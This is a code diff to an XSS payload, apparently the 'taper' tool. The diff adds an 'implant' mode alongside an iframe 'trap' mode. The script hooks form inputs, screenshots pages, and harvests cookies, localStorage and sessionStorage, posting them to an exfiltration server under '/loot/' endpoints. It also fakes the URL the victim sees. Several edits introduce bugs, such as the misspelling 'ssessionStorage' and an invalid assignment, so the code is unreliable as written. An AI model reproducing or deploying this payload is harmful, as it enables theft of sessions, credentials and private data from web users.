@@ -17,10 +17,10 @@ function initTaperVars()
 	// like adding directly to the javascript
 	// on the application server. 
 	// Setting: trap or implant
-	window.taperMode = implant;
+	window.taperMode = "implant";
 
 
-	if (window.taperMode === trap)
+	if (window.taperMode === "trap")
 	{
 		// Ue fullscreen for actual prod usage
 		// not fullscreen shows the XSS laden landing
@@ -57,11 +57,16 @@ function initTaperVars()
 	// a windows global variable. 
 
 
-	if (window.taperMode === trap)
-	{
-		sessionStorage.setKey('taperLastUrl', '');
-		//window.taperlastUrl = "";
-	}
+	// if (window.taperMode === trap)
+	// {
+	// 	sessionStorage.setItem('taperLastUrl', '');
+	// 	//window.taperlastUrl = "";
+	// }
+
+	sessionStorage.setItem('taperLastUrl', '');
+	//window.taperlastUrl = "";
+
+
 
 	// Slow down the html2canvas
 	window.taperloaded = false;
@@ -70,21 +75,21 @@ function initTaperVars()
 
 
 	// Client session
-	sessionStorage.setKey('taperSessionName', '');
+	sessionStorage.setItem('taperSessionName', '');
 	//window.tapersessionName = "";
 
 	// Cookie storage
-	sessionStorage.setKey('taperCookieStorage', '');
+	sessionStorage.setItem('taperCookieStorage', '');
 	//window.tapercookieStorageDict = {};
 
 
 	// Local storage
-	sessionStorage.setKey('taperLocalStorage', '');
+	sessionStorage.setItem('taperLocalStorage', '');
 	//window.taperlocalStorageDict = {};
 
 
 	// Session storage
-	sessionStorage.setKey('taperSessionStorage', '');
+	sessionStorage.setItem('taperSessionStorage', '');
 	//window.tapersessionStorageDict = {};
 }
 
@@ -193,7 +198,7 @@ function initSession()
 	var murderer = MurderCritter[Math.floor(Math.random()*MurderCritter.length)];
 	
 	tapersessionName = adjective + "-" + color + "-" + murderer;
-	sessionStorage.setKey('taperSessionName', tapersessionName);
+	sessionStorage.setItem('taperSessionName', tapersessionName);
 }
 
 
@@ -218,7 +223,7 @@ function sendScreenshot()
 
 		//console.log("About to send image....");
 		request = new XMLHttpRequest();request.addEventListener("load", responseHandler);
-		request.open("POST", taperexfilServer + "/loot/screenshot/" + sessionStorage.getKey('taperSessionName');
+		request.open("POST", taperexfilServer + "/loot/screenshot/" + ssessionStorage.getItem('taperSessionName'));
 
 
 		// Helps hide flashing of the page when clicking around
@@ -278,7 +283,7 @@ function hookInputs()
 				inputName = this.name;
 				inputValue = this.value;
 				request = new XMLHttpRequest();
-				request.open("POST", taperexfilServer + "/loot/input/" + sessionStorage.getKey('taperSessionName');
+				request.open("POST", taperexfilServer + "/loot/input/" + ssessionStorage.getItem('taperSessionName'));
 				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 				var jsonObj = new Object();
 				jsonObj["inputName"] = inputName;
@@ -313,7 +318,7 @@ function checkCookies()
 		cookieValue = cookieData[1];
 		// console.log("!!!!!   Checking cookies for: " + cookieName + ", " + cookieValue);
 
-		cookieDict = JSON.parse(sessionStorage.getKey('taperCookieStorage');
+		cookieDict = JSON.parse(ssessionStorage.getItem('taperCookieStorage'));
 		if (cookieName in cookieDict)
 		{
 			// console.log("== Existing cookie: " + cookieName);
@@ -339,11 +344,11 @@ function checkCookies()
 		}
 
 		// Copy dictionary back to session storage
-		sessionStorage.setKey('taperCookieStorage', JSON.stringify(cookieDict));
+		sessionStorage.setItem('taperCookieStorage', JSON.stringify(cookieDict));
 
 		// Ship it
 		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/dessert/" + sessionStorage.getKey('taperSessionName');
+		request.open("POST", taperexfilServer + "/loot/dessert/" + ssessionStorage.getItem('taperSessionName'));
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["cookieName"] = cookieName;
@@ -365,7 +370,7 @@ function checkLocalStorage()
 		value = localStorage.getItem(key)
 		//console.log("~~~ Local storage: {" + key + ", " + value + "}");
 
-		localStorageDict = JSON.parse(sessionStorage.getKey('taperLocalStorage');
+		localStorageDict = JSON.parse(ssessionStorage.getItem('taperLocalStorage'));
 
 		if (key in localStorageDict)
 		{
@@ -394,12 +399,12 @@ function checkLocalStorage()
 		}
 
 		// Copy dictionary back to session storage
-		sessionStorage.setKey('taperLocalStorage', JSON.stringify(localStorageDict));
+		sessionStorage.setItem('taperLocalStorage', JSON.stringify(localStorageDict));
 
 
 		// Ship it
 		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/localstore/" + sessionStorage.getKey('tapersessionName');
+		request.open("POST", taperexfilServer + "/loot/localstore/" + ssessionStorage.getItem('tapersessionName'));
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["key"] = key;
@@ -423,7 +428,7 @@ function checkSessionStorage()
 		// console.log("~~~ Session storage: {" + key + ", " + value + "}");
 
 
-		sessionStorageDict = JSON.parse(sessionStorage.getKey('taperSessionStorage');
+		sessionStorageDict = JSON.parse(ssessionStorage.getItem('taperSessionStorage'));
 
 		if (key in sessionStorageDict)
 		{
@@ -452,12 +457,12 @@ function checkSessionStorage()
 		}
 
 		// Copy dictionary back to session storage
-		sessionStorage.setKey('taperSessionStorage', JSON.stringify(sessionStorageDict));
+		sessionStorage.setItem('taperSessionStorage', JSON.stringify(sessionStorageDict));
 
 
 		// Ship it
 		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/sessionstore/" + sessionStorage.getKey('tapersessionName');
+		request.open("POST", taperexfilServer + "/loot/sessionstore/" + ssessionStorage.getItem('tapersessionName'));
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["key"] = key;
@@ -472,7 +477,7 @@ function checkSessionStorage()
 // Optional, copy the entire HTML and send out
 function sendHTML()
 {
-	if(window.taperMode === trap)
+	if(window.taperMode === "trap")
 	{
 		// iframe trap mode
 		trapURL = document.getElementById("iframe_a").contentDocument.location.href;
@@ -485,7 +490,7 @@ function sendHTML()
 	}
 
 	request = new XMLHttpRequest();
-	request.open("POST", taperexfilServer + "/loot/html/" + sessionStorage.getKey('taperSessionName');
+	request.open("POST", taperexfilServer + "/loot/html/" + ssessionStorage.getItem('taperSessionName'));
 	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 	var jsonObj = new Object();
 	jsonObj["url"] = trapURL;
@@ -494,6 +499,24 @@ function sendHTML()
 	request.send(jsonString);
 }
 
+
+
+// Function to hold loot stealing acalls
+function captureUrlChangeLoot()
+{
+	// Handle input scraping
+	hookInputs();
+
+	// Handle screenshotting
+	sendScreenshot();
+
+
+	// Exfil HTML code
+	if (taperexfilHTML)
+	{
+		sendHTML();
+	}
+}
 
 
 
@@ -506,6 +529,9 @@ function sendHTML()
 // iframe trap, not the one with the XSS vuln. 
 function runUpdate()
 {
+	var currentUrl = "";
+	var fullUrl = "";
+
 	if (taperMode === "trap")
 	{
 		// iFrame trap mode
@@ -527,13 +553,19 @@ function runUpdate()
 			// First click exits the iframe, reloads the normally. 
 			// Second click will properly load the external page. 
 			// Sad to lose the trap through. 
-			window.location = sessionStorage.getKey('taperLastUrl');
+			window.location = ssessionStorage.getItem('taperLastUrl');
 		}
 
-		var fakeUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
-		var fullUrl = document.getElementById("iframe_a").contentDocument.location.href;
-
+		currentUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
+		fullUrl = document.getElementById("iframe_a").contentDocument.location.href;
 	}
+	else
+	{
+		currentUrl = document.location.pathname;
+		fullUrl = document.location.href;
+	}
+
+
 
 
 
@@ -542,17 +574,17 @@ function runUpdate()
 	// console.log("$$$ href: " + document.getElementById("iframe_a").contentDocument.location.href);
 
 	// New page, let's steal stuff
-	if (taperlastUrl != fakeUrl)
+	if (ssessionStorage.getItem('taperlastUrl') != currentUrl)
 	{
 		// Handle URL recording
-		console.log("New trap URL, stealing the things: " + fakeUrl);
-		taperlastUrl = fakeUrl;
+		console.log("New trap URL, stealing the things: " + currentUrl);
+		sessionStorage.setItem('taperlastUrl') = currentUrl;
 
 		// This needs an API call to report the new page
 		// and take a screenshot maybe, not sure if
 		// screenshot timing will be right yet
 		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/location/" + tapersessionName);
+		request.open("POST", taperexfilServer + "/loot/location/" + ssessionStorage.getItem('taperSessionName'));
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		
 		var jsonObj = new Object();
@@ -561,28 +593,31 @@ function runUpdate()
 		request.send(jsonString);
 
 
-		// We need to wait until the ifram has loaded to
+		// We need to wait until the iframe/page has loaded to
 		// do HTML based looting. 
-		document.getElementById("iframe_a").onload = function() {
-			// console.log("+++ Onload ready!");
 
-			// Fake the URL that the user sees. This is important. 
-			window.history.replaceState(null, '', fakeUrl);
+		if (window.taperMode === "trap")
+		{
+			document.getElementById("iframe_a").onload = function() {
+				// console.log("+++ Onload ready!");
 
-			// Handle input scraping
-			hookInputs();
+				// Fake the URL that the user sees. This is important. 
+				window.history.replaceState(null, '', currentUrl);
 
-			// Handle screenshotting
-			sendScreenshot();
+				captureUrlChangeLoot();
 
-
-			// Exfil HTML code
-			if (taperexfilHTML)
-			{
-				sendHTML();
+			}
+		}
+		else
+		{
+			document.onload = function() {
+				captureUrlChangeLoot();
 			}
 		}
 	}
+
+
+
 
 
 	// Updates that need to happen constantly
@@ -606,8 +641,11 @@ function runUpdate()
 	// Will only report when new or changed data found
 	checkSessionStorage();
 
-	// Fake the URL that the user sees. This is important. 
-	window.history.replaceState(null, '', fakeUrl);
+	if (window.taperMode === "trap")
+	{
+		// Fake the URL that the user sees. This is important. 
+		window.history.replaceState(null, '', currentUrl);
+	}
 }
 
 
@@ -615,52 +653,64 @@ function runUpdate()
 
 
 
-// Start the trap
+// Start the tap
 function takeOver()
 {
+	var myReference = "";
 
+	if (window.taperMode === "trap")
+	{
 	//document.body.style.backgroundColor = "pink";
 	//document.innerHTML = "";
 
-	// Setup our iframe trap
-	var iframe = document.createElement("iframe");
-	iframe.setAttribute("src", taperstartingPage);
-	iframe.setAttribute("style", "border:none");
+		// Setup our iframe trap
+		var iframe = document.createElement("iframe");
+		iframe.setAttribute("src", taperstartingPage);
+		iframe.setAttribute("style", "border:none");
 
-	if (taperfullscreenIframe)
-	{
-		console.log("&& Using fullscreen");
-		iframe.style.width  = "100%";
-		iframe.style.height = "100%";
-		iframe.style.top = "0px";
-		iframe.style.left = "0px"
+		if (taperfullscreenIframe)
+		{
+			console.log("&& Using fullscreen");
+			iframe.style.width  = "100%";
+			iframe.style.height = "100%";
+			iframe.style.top = "0px";
+			iframe.style.left = "0px"
+		}
+		else
+		{
+			console.log("&& Using partial screen");
+			iframe.style.width  = "80%";
+			iframe.style.height = "80%";
+			iframe.style.top = "50px";
+			iframe.style.left = "50px";
+		}
+		iframe.style.position = "fixed";
+		iframe.id = "iframe_a";
+		document.body.appendChild(iframe);
+
+
+		// Hook needed events below...
+
+		// Just register all the darned events, each event in the iframe
+		// we'll call runUpdate()
+		var myReference = document.getElementById('iframe_a');
+
+	// Hook all the things for URL faking
+		for(var key in myReference){
+			if(key.search('on') === 0) {
+				myReference.addEventListener(key.slice(2), runUpdate);
+			}
+		}		
 	}
 	else
 	{
-		console.log("&& Using partial screen");
-		iframe.style.width  = "80%";
-		iframe.style.height = "80%";
-		iframe.style.top = "50px";
-		iframe.style.left = "50px";
+		myReference = document.contentDocument;
+		for(var key in myReference){
+			if(key.search('on') === 0) {
+				myReference.addEventListener(key.slice(2), runUpdate);
+			}
+		}		
 	}
-	iframe.style.position = "fixed";
-	iframe.id = "iframe_a";
-	document.body.appendChild(iframe);
-
-
-	// Hook needed events below...
-
-	// Just register all the darned events, each event in the iframe
-	// we'll call runUpdate()
-	var myIframe = document.getElementById('iframe_a');
-
-	// Hook all the things for URL faking
-	for(var key in myIframe){
-		if(key.search('on') === 0) {
-			myIframe.addEventListener(key.slice(2), runUpdate);
-		}
-	}
-
 }
 
 
@@ -674,10 +724,10 @@ function takeOver()
 
 
 //if (sessionStorage.getItem("taperClaimDebug")===null)
-if (window.taperClaimDebug != true)
+if (sessionStorage.getItem('taperClaimDebug') != "true")
 {
-	//sessionStorage.setItem("taperClaimDebug","optional");
-	window.taperClaimDebug = true;
+	sessionStorage.setItem("taperClaimDebug","true");
+	//window.taperClaimDebug = true;
 	//localStorage.setItem('trapLoaded', 'true');
 
 	// window.addEventListener("visibilitychange", function(e){
@@ -693,8 +743,12 @@ if (window.taperClaimDebug != true)
 	console.log("!!!! Loading payload!");
 // Blank the page so it doesn't show through as users 
 // navigate inside the iframe
-	document.body.innerHTML = "";
-	document.body.outerHTML = "";
+
+	if (window.taperMode === "trap")
+	{
+		document.body.innerHTML = "";
+		document.body.outerHTML = "";
+	}
 
 
 // Pull in html2canvas
